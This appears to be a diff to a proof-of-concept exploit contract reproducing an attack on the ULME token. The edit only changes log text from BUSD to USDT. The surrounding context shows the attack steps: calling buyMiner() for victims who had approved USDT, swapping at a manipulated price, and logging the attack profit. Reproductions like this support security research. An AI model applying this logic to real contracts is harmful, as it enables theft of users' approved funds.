@@ -99,7 +99,7 @@ contract Exploit {
             block.timestamp
         );
 
-        console.log("Call the buyMiner() function of ULME token based on pre-discovered users who approved BUSD tokens >>>\n");
+        console.log("Call the buyMiner() function of ULME token based on pre-discovered users who approved USDT tokens >>>\n");
         for(uint256 i = 0; i < victims.length; i++) {
             uint256 allowanceAmount = IERC20(USDT).allowance(victims[i], ULME);
             uint256 victimBalance = IERC20(USDT).balanceOf(victims[i]);
@@ -109,7 +109,7 @@ contract Exploit {
             }
         }
 
-        console.log("Swap ULME for BUSD with an indirectly manipulated price >>> \n");
+        console.log("Swap ULME for USDT with an indirectly manipulated price >>> \n");
         IPancakeRouter02(Router).swapExactTokensForTokensSupportingFeeOnTransferTokens (
             IERC20(ULME).balanceOf(address(this)) - 1,
             0,
@@ -134,7 +134,7 @@ contract test is DSTest{
         verify();
     }
     function verify() public {
-        console.log("============== Attack profit: ~", IERC20(0x55d398326f99059fF775485246999027B3197955).balanceOf(address(exploit)) / 1e18 ,"BUSD", "==============");
+        console.log("============== Attack profit: ~", IERC20(0x55d398326f99059fF775485246999027B3197955).balanceOf(address(exploit)) / 1e18 ,"USDT", "==============");
         console.log("There is a small difference between the attack profit and the original attack profit.");
     }
 }
